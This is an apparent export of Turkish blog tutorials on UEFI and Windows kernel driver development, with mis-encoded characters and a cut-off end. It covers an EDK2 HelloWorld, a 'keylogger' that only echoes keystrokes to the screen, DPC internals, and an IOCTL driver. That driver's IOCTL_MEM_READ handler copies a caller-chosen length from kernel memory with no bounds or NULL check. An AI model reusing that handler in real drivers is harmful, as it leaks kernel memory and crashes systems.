adÄ±nda bir proje daha oluÅŸturalÄ±m:\n[Defines] INF_VERSION = 0x00010006 BASE_NAME = HelloWorld MODULE_TYPE = UEFI_APPLICATION VERSION_STRING = 1.0 ENTRY_POINT = UefiMain [Sources] HelloWorld.c [Packages] MdePkg/MdePkg.dec ShellPkg/ShellPkg.dec MdeModulePkg/MdeModulePkg.dec [LibraryClasses] UefiApplicationEntryPoint UefiLib PcdLib .inf dosyasÄ±nÄ± da kodladÄ±ktan sonra her ÅŸey tamam ancak derlemeye geÃ§meden Ã¶nce /edk2/ShellPkg/ShellPkg.dsc iÃ§erisine projemizi eklememiz gerekecek:\n...\r[Components]\r#\r# Build all the libraries when building this package.\r# This helps developers test changes and how they affect the package.\r#\rShellPkg/Library/UefiShellLib/UefiShellLib.inf\rShellPkg/Library/UefiShellAcpiViewCommandLib/UefiShellAcpiViewCommandLib.inf\rShellPkg/Library/UefiShellCommandLib/UefiShellCommandLib.inf\rShellPkg/Library/UefiShellCEntryLib/UefiShellCEntryLib.inf\rShellPkg/Library/UefiHandleParsingLib/UefiHandleParsingLib.inf\rShellPkg/Library/UefiShellBcfgCommandLib/UefiShellBcfgCommandLib.inf\rShellPkg/Library/UefiShellLevel1CommandsLib/UefiShellLevel1CommandsLib.inf\rShellPkg/Library/UefiShellLevel2CommandsLib/UefiShellLevel2CommandsLib.inf\rShellPkg/Library/UefiShellLevel3CommandsLib/UefiShellLevel3CommandsLib.inf\rShellPkg/Library/UefiShellDriver1CommandsLib/UefiShellDriver1CommandsLib.inf\rShellPkg/Library/UefiShellInstall1CommandsLib/UefiShellInstall1CommandsLib.inf\rShellPkg/Library/UefiShellDebug1CommandsLib/UefiShellDebug1CommandsLib.inf\rShellPkg/Library/UefiShellNetwork1CommandsLib/UefiShellNetwork1CommandsLib.inf\rShellPkg/Library/UefiShellNetwork2CommandsLib/UefiShellNetwork2CommandsLib.inf\rShellPkg/Application/HelloWorld/HelloWorld.inf YukarÄ±da gÃ¶sterildiÄŸi gibi Components altÄ±na HelloWorld projenizi ekleyin\nÅimdi ise projemizi derleyelim:\nBuild -m ShellPkg\\Application\\HelloWorld\\HelloWorld.inf Derlemeden sonra efi dosyamÄ±z /edk2/Build/Shell/RELEASE_VS2022/X64 dizini altÄ±nda â€˜HelloWorld.efiâ€™ olarak oluÅŸturulacaktÄ±r.\nSÃ¼rÃ¼cÃ¼yÃ¼ Ã‡alÄ±ÅŸtÄ±rma Ã–nceden de bahsettiÄŸim gibi simÃ¼le iÅŸlemleri iÃ§in VMWare ortamÄ±nÄ± kullanacaÄŸÄ±m. EÄŸer benim gibi VMware veya VirtualBox vs. kullanacaksÄ±nÄ±z FAT32 ile biÃ§imlendirilmiÅŸ bir USB Flash gerekecek. FAT 32 BiÃ§imlendirmeden sonra USB Flash iÃ§erisinde efi/boot olarak bir dizin oluÅŸturun.\nYine /edk2/Build/Shell/RELEASE_VS2022/X64 dizini altÄ±nda iki shell dosyasÄ± olacak:\nBuradan herhangi birini efi/boot dizini altÄ±nda bootx64.efi olarak kopyalayÄ±n. Daha sonra HelloWorld.efi dosyasÄ±nÄ± da kÃ¶k dizine kopyalayÄ±n.\nBu iÅŸlemlerden sonra USB Flashâ€™Ä±n iÃ§eriÄŸi aÅŸaÄŸÄ±da gÃ¶sterildiÄŸi gibi olmalÄ±:\nHelloWorld.efi efi boot bootx64.efi Sanal makineyi baÅŸlatalÄ±m ve aÅŸaÄŸÄ±daki adÄ±mlarÄ± gerÃ§ekleÅŸtirelim:\nRemovable Devices \u003e USB Flash BelleÄŸiniz \u003e Connect seÃ§eneÄŸine tÄ±klayalÄ±m.\nSanal makineyi yeniden baÅŸlatalÄ±m ve aÃ§Ä±lÄ±ÅŸta DEL tuÅŸuna basalÄ±m:\nBoot Manager ekranÄ±ndan USB FlashÄ±mÄ±zÄ± seÃ§elim. Bu kadar basit!\nÅimdi ise HelloWorld sÃ¼rÃ¼cÃ¼mÃ¼zÃ¼ Ã§alÄ±ÅŸtÄ±ralÄ±m:\nBaÅŸarÄ±yla â€˜Hello UEFI Worldâ€™ Ã§Ä±ktÄ±mÄ±zÄ± alÄ±yoruz.\nSonuÃ§ Evet arkadaÅŸlar bu dÃ¶kÃ¼manda temel olarak UEFIâ€™nin ne olduÄŸunu, Windowsâ€™ta EDK2 kurulumunu ve basitÃ§e UEFI sÃ¼rÃ¼cÃ¼sÃ¼ ile â€˜Hello UEFI Worldâ€™ Ã§Ä±ktÄ±sÄ± veren bir proje geliÅŸtirdik. UmarÄ±m faydalÄ± olmuÅŸtur.\nKonularÄ± daha detaylÄ± Ã¶ÄŸrenmek isterseniz referanslarda verdiÄŸim kaynaklara gÃ¶z atabilirsiniz.\nÄ°yi Ã§alÄ±ÅŸmalar dilerim efenimm.\nReferences Wikipedia - UEFI Dabudabot - Beginning UEFI Development Secret Club - Introduction to UEFI: Part 1 Binary Ninja - Advanced UEFI Analysis with Binary Ninja ","sonuÃ§#\u003cstrong\u003eSonuÃ§\u003c/strong\u003e":"","sÃ¼rÃ¼cÃ¼yÃ¼-Ã§alÄ±ÅŸtÄ±rma#\u003cstrong\u003eSÃ¼rÃ¼cÃ¼yÃ¼ Ã‡alÄ±ÅŸtÄ±rma\u003c/strong\u003e":"","uefi-developmenta-giriÅŸ#\u003cstrong\u003eUEFI Development\u0026rsquo;a GiriÅŸ\u003c/strong\u003e":"","uefi-nedir#\u003cstrong\u003eUEFI Nedir?\u003c/strong\u003e":"","uefi-Ã¶nyÃ¼kleme-sÃ¼reci#\u003cstrong\u003eUEFI Ã–nyÃ¼kleme SÃ¼reci\u003c/strong\u003e":"","windowsta-edk2nin-kurulumu#\u003cstrong\u003eWindows\u0026rsquo;ta EDK2\u0026rsquo;nin Kurulumu\u003c/strong\u003e":""},"title":"Introduction to UEFI"},"/tr/docs/uefi-dev/uefi-keylogger/":{"data":{"":"","kodlama#\u003cstrong\u003eKodlama\u003c/strong\u003e":"","sonuÃ§#\u003cstrong\u003eSonuÃ§\u003c/strong\u003e":"Merhabalar. Bu blogta UEFIâ€™de basit bir keylogger geliÅŸtireceÄŸiz. Bir Ã¶nceki blogta temel olarak UEFIâ€™yi anlamÄ±ÅŸtÄ±k ve edk2 kurulumunu tamamlamÄ±ÅŸtÄ±k ve ardÄ±ndan bir adet gereÄŸi â€œHello Worldâ€ Ã§Ä±ktÄ±sÄ± veren sÃ¼rÃ¼cÃ¼ yazmÄ±ÅŸtÄ±k. ArtÄ±k basit projeler geliÅŸtirebilir hale geldik.\nKabaca yapacaÄŸÄ±mÄ±z ÅŸey UEFIâ€™de klavyeden basÄ±lan tuÅŸlarÄ± ekrana bastÄ±ran bir sÃ¼rÃ¼cÃ¼ yazacaÄŸÄ±z.\nKodlama KeyLogger.c projesi oluÅŸturalÄ±m ve aÅŸaÄŸÄ±daki kodlarÄ± yapÄ±ÅŸtÄ±ralÄ±m:\n#include \u003cUefi.h\u003e #include \u003cLibrary/UefiApplicationEntryPoint.h\u003e #include \u003cLibrary/UefiLib.h\u003e EFI_STATUS EFIAPI UefiMain( EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable ) { EFI_SIMPLE_TEXT_INPUT_PROTOCOL *TextInput; EFI_INPUT_KEY Key; /* Protokole eriÅŸim saÄŸla */ TextInput = SystemTable-\u003eConIn; Print (L\"UEFI Keylogger!\\n\"); while(1) { TextInput-\u003eReadKeyStroke ( TextInput, \u0026Key ); if (Key.ScanCode == SCAN_ESC) { Print (L\"ESC Button Detected\\n\"); break; } if (Key.UnicodeChar != 0) { Print (L\"Pressed: %c\\n\", Key.UnicodeChar); } } return EFI_SUCCESS; } Kodumuz oldukÃ§a basit. DetaylÄ±ca gÃ¶z atalÄ±m:\nEFI_SIMPLE_TEXT_INPUT_PROTOCOL *TextInput; EFI_INPUT_KEY Key; SÃ¼rÃ¼cÃ¼mÃ¼zde EFI_SIMPLE_TEXT_INPUT_PROTOCOL protokolÃ¼ ile bir pointer oluÅŸturarak baÅŸlÄ±yoruz. Bu pointer, klavyeden gelen giriÅŸleri yakalamak iÃ§in kullanacaÄŸÄ±z. EFI_SIMPLE_TEXT_INPUT_PROTOCOL protokolÃ¼, klavye giriÅŸlerini okuma iÅŸlemini gerÃ§ekleÅŸtiren temel bir protokoldÃ¼r.\nDaha sonra klavyeden basÄ±lan tuÅŸlarÄ± bir deÄŸiÅŸkene kaydetmek iÃ§in EFI_INPUT_KEY tipinde bir deÄŸiÅŸken oluÅŸturuyoruz.\nTextInput = SystemTable-\u003eConIn; Bu kÄ±sÄ±mda ise EFI_SIMPLE_TEXT_INPUT_PROTOCOLâ€™e eriÅŸim saÄŸlÄ±yoruz. ConIn, Console Input Protocol (Konsol GiriÅŸ ProtokolÃ¼) iÃ§in kullanÄ±lan bir Ã¼ye deÄŸiÅŸkendir.\nwhile(1) { TextInput-\u003eReadKeyStroke ( TextInput, \u0026Key ); if (Key.ScanCode == SCAN_ESC) { Print (L\"ESC Button Detected\\n\"); break; } if (Key.UnicodeChar != 0) { Print (L\"Pressed: %c\\n\", Key.UnicodeChar); } } ArtÄ±k bir dÃ¶ngÃ¼ ile basÄ±lan tuÅŸlarÄ± ekrana bastÄ±rmaya baÅŸlÄ±yoruz. ReadKeyStroke ile basÄ±lan tuÅŸlarÄ± Key deÄŸiÅŸkenine aktarÄ±yoruz.\nEÄŸer basÄ±lan tuÅŸ ESC (SCAN_ESC) tuÅŸuysa sÃ¼rÃ¼cÃ¼nÃ¼n dÃ¶ngÃ¼den Ã§Ä±kmasÄ±nÄ± saÄŸlÄ±yoruz. EÄŸer deÄŸilse basÄ±lan tuÅŸu ekrana bastÄ±rÄ±yoruz.\nSÃ¼rÃ¼cÃ¼yÃ¼ Ã‡alÄ±ÅŸtÄ±rma KeyLogger.inf dosyasÄ±nÄ± oluÅŸturalÄ±m ve aÅŸaÄŸÄ±daki kodlarÄ± yapÄ±ÅŸtÄ±ralÄ±m:\n[Defines] INF_VERSION = 0x00010006 BASE_NAME = KeyLogger MODULE_TYPE = UEFI_APPLICATION VERSION_STRING = 1.0 ENTRY_POINT = UefiMain [Sources] KeyLogger.c [Packages] MdePkg/MdePkg.dec ShellPkg/ShellPkg.dec MdeModulePkg/MdeModulePkg.dec [LibraryClasses] UefiApplicationEntryPoint UefiLib AÅŸaÄŸÄ±daki kodla projemizi build edelim:\nBuild -m ShellPkg\\Application\\KeyLogger\\KeyLogger.inf Her ÅŸey tamam olduÄŸuna gÃ¶re sonuca bakabiliriz:\nGÃ¶rdÃ¼ÄŸÃ¼nÃ¼z gibi klavyeden bastÄ±ÄŸÄ±m tuÅŸlar ekrana bastÄ±rÄ±lÄ±yor. ESC tuÅŸuna basÄ±ldÄ±ÄŸÄ±nda ise sÃ¼rÃ¼cÃ¼ kapanÄ±yor.\nSonuÃ§ Bu blogta UEFI sÃ¼rÃ¼cÃ¼sÃ¼ ile basit bir Keylogger geliÅŸtirmeyi Ã¶ÄŸrendik. Blogun basit olduÄŸunun farkÄ±ndayÄ±m ancak daha yeni olduÄŸumuz iÃ§in ve UEFI projelerine adepte olabilmek iÃ§in bÃ¶yle basit projelerle ilerlemenin gÃ¼zel olacaÄŸÄ±nÄ± dÃ¼ÅŸÃ¼nÃ¼yorum. Ä°lerideki sÃ¼reÃ§lerde daha derin projelere giriÅŸeceÄŸiz.","sÃ¼rÃ¼cÃ¼yÃ¼-Ã§alÄ±ÅŸtÄ±rma#\u003cstrong\u003eSÃ¼rÃ¼cÃ¼yÃ¼ Ã‡alÄ±ÅŸtÄ±rma\u003c/strong\u003e":""},"title":"UEFI Keylogger"},"/tr/docs/winkernel-dev/":{"data":{"":"Windows Kernel Development ile ilgili konularÄ± incelemek iÃ§in aÅŸaÄŸÄ±daki bÃ¶lÃ¼mlere gÃ¶z atabilirsiniz:\nDeferred Procedure Call\rSystem Service Descriptor Table\rVirtual Memory\rDevice Input and Output Control\rI/O request packets"},"title":"Windows Kernel Dev."},"/tr/docs/winkernel-dev/wkd-dpc/":{"data":{"":"","#":"","proje#\u003cstrong\u003eProje\u003c/strong\u003e":"","references#\u003cstrong\u003eReferences\u003c/strong\u003e":" DPC (Deferred Procedure Call) Windows kernelâ€™da bulunan bir mekanizmadÄ±r. AmacÄ±, bir fonksiyonun daha sonra daha dÃ¼ÅŸÃ¼k bir IRQLâ€™de (aÅŸaÄŸÄ±da detaylandÄ±rÄ±lacaktÄ±r) Ã§alÄ±ÅŸmasÄ±nÄ± planlamak iÃ§in kullanÄ±lÄ±r. BaÅŸka bir deyiÅŸle, Windowsâ€™un Ã¶nemli iÅŸleri daha sonra halletmesi iÃ§in bir yoldur. DPC, bir kesme meydana geldiÄŸinde veya sistemin Ã§ok hÄ±zlÄ± yanÄ±t vermesi gerektiÄŸinde kullanÄ±ÅŸlÄ±dÄ±r. Bu nedenle, DPC kesinti iÅŸleyici gibi yÃ¼ksek Ã¶ncelikli gÃ¶revlerin yÃ¼rÃ¼tÃ¼lmesine, ancak daha sonra yÃ¼rÃ¼tÃ¼lmek Ã¼zere daha dÃ¼ÅŸÃ¼k Ã¶ncelikli gÃ¶revlerin yÃ¼rÃ¼tÃ¼lmesine izin verir.\nHer DPC, Ã§ekirdek tarafÄ±ndan oluÅŸturulan ve baÅŸlatÄ±lan DPC Nesnesi ile iliÅŸkilendirilir. Bir aygÄ±t sÃ¼rÃ¼cÃ¼sÃ¼ bir DPC isteÄŸi yayÄ±nlayabilir ve ardÄ±ndan DPC isteÄŸi DPC kuyruÄŸunun sonuna eklenir. DPC Nesneleri IRQLâ€˜in DISPATCH_LEVELâ€˜inde sÄ±ralanÄ±r. Ancak devam etmeden Ã¶nce IRQL konusuna bir gÃ¶z atalÄ±m.\nIRQL â€˜IRQLâ€™ (Interrupt Request Level) terimi, basitÃ§e bir CPUâ€™nun herhangi bir zamanda Ã§alÄ±ÅŸtÄ±ÄŸÄ± mevcut donanÄ±m Ã¶nceliÄŸini tanÄ±mlar. Bunun iÃ§in, her donanÄ±mÄ±n belirli bir istek seviyesine karÅŸÄ±lÄ±k geldiÄŸi haritalar vardÄ±r. Ä°ÅŸte X64 iÃ§in bir harita:\nNumber Name 15 High/Profile 14 Inter-Processor Interrupt 13 Clock 12 Synch Device[n] . . Device[1] 2 Dispatch/DPC 1 APC 0 Passive/Low Mevcut Ã§alÄ±ÅŸan iÅŸ parÃ§acÄ±ÄŸÄ±, CPU durumunu kaydeden ve gelen IRQL ile eÅŸlenen Kesme Hizmeti Rutinini (ISR) iÅŸleyen bu kesintileri ele almaktan sorumludur. Her bir kesme rutini Kesme AÃ§Ä±klama Tablosunda (IDT) listelenmiÅŸtir. Bu tabloyu Windbg ile dÃ¶kebiliriz:\nBu kafa karÄ±ÅŸtÄ±rÄ±cÄ± gibi gÃ¶zÃ¼len Ã§Ä±ktÄ±da vektÃ¶r numaralarÄ±nÄ±, adresleri ve ntoskrnl rutinlerini gÃ¶rebiliriz. Ã–rneÄŸin, KiDivideErrorFaultâ€™un gÃ¶lgesi olan 0x0 KiDivideErrorFaultShadow vektÃ¶rÃ¼, KullanÄ±cÄ± Modu veya Ã‡ekirdek Modu AlanÄ±ndan bir bÃ¶lme iÅŸlemi hata ile sonuÃ§landÄ±ÄŸÄ±nda Ã§aÄŸrÄ±lÄ±r.\nBaÅŸka bir Ã¶rnek, listenin devamÄ±nda CPU Clock gÃ¶rebiliriz:\nd1:\tfffff805d0cd2948 nt!HalpTimerClockInterrupt (KINTERRUPT fffff805d0f60a40) BÃ¶ylece, IRQL seviyesinin X64 tablosundaki 13. deÄŸere karÅŸÄ±lÄ±k gelip gelmediÄŸini doÄŸrulayabiliriz:\nKINTERRUPT yapÄ±sÄ± ise kernel bellek yapÄ±sÄ±dÄ±r ve interrupt hakkÄ±nda Ã¶nemli bilgiler tutar:\nkd\u003e dt _KINTERRUPT nt!_KINTERRUPT +0x000 Type : Int2B +0x002 Size : Int2B +0x008 InterruptListEntry : _LIST_ENTRY +0x018 ServiceRoutine : Ptr64 unsigned char ... Bu Ã§Ä±ktÄ±da, anahtar Ã¼yemiz 0x18 ofsetindeki ServiceRoutineâ€™dir. Bu pointer, iliÅŸkili interrupt tetiklendiÄŸinde, Ã§alÄ±ÅŸtÄ±rÄ±lacak olan Interrupt Service Routine (ISR) adresini tutar.\nProje Basit bir proje ile bu konuyu daha iyi anlayabiliriz:\n#pragma warning(error:28251) #include \"main.h\" VOID DpcRoutine( _In_ struct _KDPC* Dpc, _In_ PVOID DeferredContext, _In_ PVOID SystemArgument1, _In_ PVOID SystemArgument2 ) { UNREFERENCED_PARAMETER(Dpc); UNREFERENCED_PARAMETER(DeferredContext); UNREFERENCED_PARAMETER(SystemArgument1); UNREFERENCED_PARAMETER(SystemArgument2); DbgPrintEx(0, 0, \"DPC routine executed\\n\"); } NTSTATUS DriverUnload(PDRIVER_OBJECT DriverObject) { UNREFERENCED_PARAMETER(DriverObject); DbgPrintEx(0, 0, \"Driver Unload\\n\"); return STATUS_SUCCESS; } NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) { UNREFERENCED_PARAMETER(RegistryPath); DriverObject-\u003eDriverUnload = DriverUnload; DbgPrintEx(0, 0, \"Starting Driver...\\n\"); KDPC DpcObject; /* Initialize Dpc Object */ KeInitializeDpc(\u0026DpcObject, DpcRoutine, NULL); /* Queue the DPC */ KeInsertQueueDpc(\u0026DpcObject, NULL, NULL); return STATUS_SUCCESS; } KodlarÄ±mÄ±z bu ÅŸekilde.\nÄ°lk olarak projede DPC Objectâ€™i KeInitializeDpc ile initialize ederek baÅŸlÄ±yoruz:\nKDPC DpcObject; /* Initialize Dpc Object */ KeInitializeDpc(\u0026DpcObject, DpcRoutine, NULL); KDPC yapÄ±sÄ± ise basitÃ§e DPC Objectâ€™ler iÃ§in kullanÄ±lan bir yapÄ±dÄ±r:\nkd\u003e dt _KDPC nt!_KDPC +0x000 TargetInfoAsUlong : Uint4B +0x000 Type : UChar +0x001 Importance : UChar +0x002 Number : Uint2B +0x008 DpcListEntry : _SINGLE_LIST_ENTRY +0x010 ProcessorHistory : Uint8B +0x018 DeferredRoutine : Ptr64 void +0x020 DeferredContext : Ptr64 Void +0x028 SystemArgument1 : Ptr64 Void +0x030 SystemArgument2 : Ptr64 Void +0x038 DpcData : Ptr64 Void Burada ise anahtar Ã¼yemiz DeferredRoutine olabilir. Bu Ã¼ye DPC Rutininin adresini tutar. Bunu KeInitializeDpc kodlarÄ±nda gÃ¶rebiliriz:\nrdx registerâ€™Ä± KeInitializeDpcâ€™nin ikinci parametresini tutar ve bu deÄŸer DPC+DeferredRoutineâ€™e aktarÄ±lÄ±r. KDPC yapÄ±sÄ± 0x113 ofsetine karÅŸÄ±lÄ±k gelir.\nDaha sonra, DPC Objectâ€™i KeInsertQueueDpc ile DPCâ€™i Ã§alÄ±ÅŸtÄ±rmak iÃ§in kuyruÄŸa ekliyoruz:\n/* Queue the DPC */ KeInsertQueueDpc(\u0026DpcObject, NULL, NULL); Ve sonra DPCâ€™miz Ã§alÄ±ÅŸtÄ±rÄ±lacaktÄ±r:\nYaptÄ±klarÄ±mÄ±zÄ± tekrar edersek, Bir driver, projede yaptÄ±ÄŸÄ±mÄ±z gibi KeInitializeDpc â€˜yi Ã§aÄŸÄ±rarak bir device object iÃ§in bir rutin kaydeder bu fonksiyon bir create object oluÅŸturur. ArdÄ±ndan Custom DPCâ€™i (DpcRoutine fonksiyonumuz gibi) yÃ¼rÃ¼tmek iÃ§in KeInsertQueueDpc â€˜yi Ã§aÄŸÄ±rÄ±lÄ±r:\nBu figÃ¼r bize attÄ±ÄŸÄ±mÄ±z yaptÄ±ÄŸÄ±mÄ±z iÅŸlemleri daha iyi anlamamÄ±za yardÄ±mcÄ± olabilir.\nReferences Microsoft - Introduction to DPC objects Wikipedia - Deferred Procedure Call Offsec - IRQLs Close Encounters of the Rootkit Kind ired team - IDT Microsoft Docs - Registering and Queuing a CustomDpc Routine Microsoft Docs - Windows kernel opaque structures "},"title":"DPC"},"/tr/docs/winkernel-dev/wkd-ioctl/":{"data":{"":"","code#Code":"","ioctl-nedir#IOCTL Nedir?":"","references#References":"Merhabalar, bu yazÄ±da Windows Kernel Developmentâ€™tan IOCTL mekanizmasÄ±nÄ± inceleyeceÄŸiz.\nIOCTL Nedir? I/O Control Codes (G/Ã‡ Kontrol KodlarÄ±) olarak adlandÄ±rÄ±lan IOCTL, User-mode uygulamarÄ±n ve sÃ¼rÃ¼cÃ¼lerin arasÄ±ndaki iletiÅŸim iÃ§in veya stack iÃ§erisindeki sÃ¼rÃ¼cÃ¼ler arasÄ±ndaki iletiÅŸim iÃ§in kullanÄ±lan bir mekanizmadÄ±r. I/O Kontrol kodlarÄ±, Ã¶nceki konumda bahsettiÄŸim IRPâ€™ler aracÄ±lÄ±ÄŸÄ±yla gÃ¶nderilir. EÄŸer IRPâ€™ler hakkÄ±nda bir bilginiz yoksa buraya tÄ±klayarak IRPâ€™ler hakkÄ±nda bilgi alabilirsiniz.\nWindowsâ€™ta User-mode programlarÄ±, DeviceIoControl API kullanarak sÃ¼rÃ¼cÃ¼lere IOCTL kodlarÄ±nÄ± gÃ¶nderir. Bu API, alÄ±nan IOCTL kodunu IRP_MJ_DEVICE_CONTROL aracÄ±lÄ±ÄŸÄ±yla sÃ¼rÃ¼cÃ¼ye gÃ¶nderir. AynÄ± zamanda IOCTL mekanizmanÄ±n tek Ã¶zelliÄŸi de bu olmadÄ±ÄŸÄ±nÄ± tekrar vurgulayalÄ±m. Ä°leri seviye sÃ¼rÃ¼cÃ¼lerin IRP_MJ_DEVICE_CONTROL veya IRP_MJ_INTERNAL_DEVICE_CONTROL aracÄ±lÄ±ÄŸÄ±ya istek oluÅŸturarak, alt sÃ¼rÃ¼cÃ¼lere IOCTL isteÄŸi gÃ¶nderme imkanÄ± sunar.\nIOCTL kodlarÄ±, genellikle sÃ¼rÃ¼cÃ¼ geliÅŸtiricileri tarafÄ±ndan tanÄ±mlanan Ã¶zel kodlar olabilir, ancak aynÄ± zamanda Windows iÅŸletim sistemi tarafÄ±ndan belirli standart iÅŸlemler iÃ§in Ã¶nceden tanÄ±mlanmÄ±ÅŸ kodlar da olabilir. Bu standart IOCTL kodlarÄ±, Windowsâ€™un donanÄ±m ve yazÄ±lÄ±m bileÅŸenleri arasÄ±ndaki iletiÅŸimi standartlaÅŸtÄ±rmak ve kolaylaÅŸtÄ±rmak amacÄ±yla saÄŸlanÄ±r. Ã–rneÄŸin, bazÄ± IOCTL kodlarÄ±, donanÄ±m cihazlarÄ±nÄ±n Ã¶zelliklerini sorgulama veya belirli iÅŸlemleri baÅŸlatma gibi genel gÃ¶revler iÃ§in kullanÄ±lÄ±r. GeliÅŸtiriciler, Ã¶zel ihtiyaÃ§larÄ±na gÃ¶re bu kodlarÄ± Ã¶zelleÅŸtirebilir veya yeni kodlar tanÄ±mlayabilirler, bu da esneklik ve geniÅŸletilebilirlik saÄŸlar.\nCode Ã–nceki konumuzda olduÄŸu gibi user-mode program ve kernel-mode sÃ¼rÃ¼cÃ¼mÃ¼zÃ¼ oluÅŸturacaÄŸÄ±z.\nSenaryoda IOCTL_MEM_ALLOCATE kodu aracÄ±lÄ±ÄŸÄ±yla user-mode uygulamasÄ± sÃ¼rÃ¼cÃ¼ye kernel-space alanÄ±nda bellek ayÄ±rmasÄ± iÃ§in kod ve bir veri gÃ¶nderecek. Ã–te yandan oluÅŸturacaÄŸÄ±mÄ±z IOCTL_MEM_READ kodu ile sÃ¼rÃ¼cÃ¼mÃ¼z, bellek adresten veriyi alÄ±p user-mode programa gÃ¶nderecek.\nGithub linki iÃ§in buraya tÄ±klayabilirsiniz.\nKernel Mode - Driver Ã–ncekikle sÃ¼rÃ¼cÃ¼mÃ¼zÃ¼ kodlayarak baÅŸlayalÄ±m:\n#include \"main.h\" #define TAG 'beko' #define IOCTL_MEM_ALLOCATE \\ CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS) #define IOCTL_MEM_READ \\ CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS) PVOID GlobalMemoryAddr = NULL; NTSTATUS IoCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) { UNREFERENCED_PARAMETER(DeviceObject); PIO_STACK_LOCATION Stack = IoGetCurrentIrpStackLocation(Irp); NTSTATUS status = STATUS_SUCCESS; switch (Stack-\u003eMajorFunction) { case IRP_MJ_CREATE: Irp-\u003eIoStatus.Status = STATUS_SUCCESS; break; case IRP_MJ_CLOSE: Irp-\u003eIoStatus.Status = STATUS_SUCCESS; break; default: status = STATUS_INVALID_DEVICE_REQUEST; break; } Irp-\u003eIoStatus.Information = 0; IoCompleteRequest(Irp, IO_NO_INCREMENT); return Irp-\u003eIoStatus.Status; } NTSTATUS IoControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) { UNREFERENCED_PARAMETER(DeviceObject); PIO_STACK_LOCATION Stack = IoGetCurrentIrpStackLocation(Irp); PVOID Data = Irp-\u003eAssociatedIrp.SystemBuffer; PCHAR UserBuffer = (PCHAR)Data; ULONG OutLength = Stack-\u003eParameters.DeviceIoControl.OutputBufferLength; ULONG Length = Stack-\u003eParameters.DeviceIoControl.InputBufferLength; ULONG Tag = TAG; switch (Stack-\u003eParameters.DeviceIoControl.IoControlCode) { case IOCTL_MEM_ALLOCATE: if (NULL == UserBuffer || 0 == Length) { Irp-\u003eIoStatus.Status = STATUS_INVALID_PARAMETER; Irp-\u003eIoStatus.Information = 0; break; } DbgPrintEx(0, 0, \"Data from UserLand program: %.*s\", Length, UserBuffer); GlobalMemoryAddr = ExAllocatePool2(POOL_FLAG_NON_PAGED, Length, Tag); if (NULL == GlobalMemoryAddr) { Irp-\u003eIoStatus.Status = STATUS_INSUFFICIENT_RESOURCES; Irp-\u003eIoStatus.Information = 0; break; } RtlCopyMemory(GlobalMemoryAddr, UserBuffer, Length); Irp-\u003eIoStatus.Status = STATUS_SUCCESS; Irp-\u003eIoStatus.Information = Length; break; case IOCTL_MEM_READ: RtlCopyMemory(UserBuffer, GlobalMemoryAddr, OutLength); Irp-\u003eIoStatus.Status = STATUS_SUCCESS; Irp-\u003eIoStatus.Information = OutLength; break; default: Irp-\u003eIoStatus.Status = STATUS_INVALID_DEVICE_REQUEST; Irp-\u003eIoStatus.Information = 0; break; } IoCompleteRequest(Irp, IO_NO_INCREMENT); return Irp-\u003eIoStatus.Status; } NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) { UNREFERENCED_PARAMETER(RegistryPath); UNICODE_STRING DeviceName = RTL_CONSTANT_STRING(L\"\\\\Device\\\\MyDevice\"); UNICODE_STRING SymName = RTL_CONSTANT_STRING(L\"\\\\??\\\\MyDevice\"); PDEVICE_OBJECT DeviceObject; NTSTATUS Status; Status = IoCreateDevice(DriverObject, 0, \u0026DeviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, \u0026DeviceObject); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to Create I/O Device!\\n\"); return Status; } Status = IoCreateSymbolicLink(\u0026SymName, \u0026DeviceName); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to Create Symbolic Link!\\n\"); return Status; } DriverObject-\u003eMajorFunction[IRP_MJ_CREATE] = IoCreateClose; DriverObject-\u003eMajorFunction[IRP_MJ_CLOSE] = IoCreateClose; DriverObject-\u003eMajorFunction[IRP_MJ_DEVICE_CONTROL] = IoControl; DriverObject-\u003eDriverUnload = UnloadDriver; return STATUS_SUCCESS; } NTSTATUS UnloadDriver(PDRIVER_OBJECT DriverObject) { UNICODE_STRING SymName = RTL_CONSTANT_STRING(L\"\\\\??\\\\MyDevice\"); DbgPrintEx(0, 0, \"Unloading the Driver...\\n\"); IoDeleteSymbolicLink(\u0026SymName); IoDeleteDevice(DriverObject-\u003eDeviceObject); return STATUS_SUCCESS; } Ã–nceki IRP konusuna aÅŸina olduysanÄ±z zaten hemen hemen benzer kod olduÄŸunu anlamÄ±ÅŸsÄ±nÄ±zdÄ±r. Åimdi detaylÄ±ca gÃ¶z atalÄ±m:\n#define IOCTL_MEM_ALLOCATE \\ CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS) #define IOCTL_MEM_READ \\ CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS) Her ÅŸeyden Ã¶nce konumuzla ilgisi olan tanÄ±mladÄ±ÄŸÄ±mÄ±z IOCTL kodlarÄ±na bir bakalÄ±m.\nCTL_CODE makrosu, IOCTL kodlarÄ±nÄ± tanÄ±mlamak iÃ§in kullanÄ±lÄ±r ve bu makro, Ã§eÅŸitli parametrelerle birlikte bir IOCTL kodu oluÅŸturur. Parametreler ÅŸunlardÄ±r:\nDeviceType: Cihaz tÃ¼rÃ¼nÃ¼ belirtir. Bu, FILE_DEVICE_UNKNOWN, FILE_DEVICE_DISK, FILE_DEVICE_KEYBOARD gibi veya diÄŸerlerinden biri olabilir. Burada kullandÄ±ÄŸÄ±mÄ±z FILE_DEVICE_UNKNOWN, belirli bir cihaz tÃ¼rÃ¼ belirtmediÄŸimiz ve genel bir cihaz tipi kullandÄ±ÄŸÄ±mÄ±z anlamÄ±na gelir.\nFunctionCode: IOCTL iÅŸleminin benzersiz bir kodunu belirler. Bu, iÅŸlemi tanÄ±mlayan bir sayÄ±dÄ±r ve genellikle uygulama veya sÃ¼rÃ¼cÃ¼ tarafÄ±ndan belirlenen bir deÄŸerdir. Ã–rneÄŸin, 